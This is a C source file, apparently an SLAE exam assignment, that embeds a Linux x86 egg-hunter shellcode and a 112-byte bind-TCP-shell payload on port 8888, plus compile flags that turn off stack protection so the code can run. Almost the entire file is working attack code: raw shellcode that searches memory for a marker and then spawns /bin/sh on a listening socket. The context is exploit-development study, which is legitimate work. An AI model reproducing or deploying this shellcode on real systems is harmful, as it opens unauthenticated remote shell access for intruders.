/*
; License: This work is licensed under a Creative Commons
  Attribution-NonCommercial 4.0 International License.
; Filename: eggHuntWrapper.c
; Author:   Muhereza Herbert
; Website:  http://kilobytesecurity.com
;
; Purpose: SLAE Exam requirement Assignment Three
; USAGE: 
; 	Edit EGG constant var to egg of choice
;	Edit  
;	Compile: gcc -m32 -fno-stack-protector -z execstack eggHuntWrapper.c -o eggHuntWrapper
*/
#include <stdio.h>
#include <string.h>
#define EGG "\x90\x50\x90\x50" //Executable EGG
 
unsigned char egg_hunter[] = \
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
unsigned char egg_shell[] = \
EGG
// Bind TCP Shell 112 Bytes Port 8888
"\x31\xdb\x31\xc0\xb0\x66\xfe\xc3\x56\x6a\x01\x6a"
"\x02\x89\xe1\xcd\x80\x97\x56\x66\x68\x22\xb8\x66"
"\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3"
"\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x56\x57\x31\xdb"
"\xf7\xe3\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xdb"
"\xf7\xe3\x56\x56\x57\xb0\x66\xb3\x05\x89\xe1\xcd"
"\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79"
"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
void main()
{
    printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egg_hunter));
    printf("Length of Actual Shellcode:  %d\n", strlen(egg_shell));
    int (*ret)() = (int(*)())egg_hunter;
    ret();
}
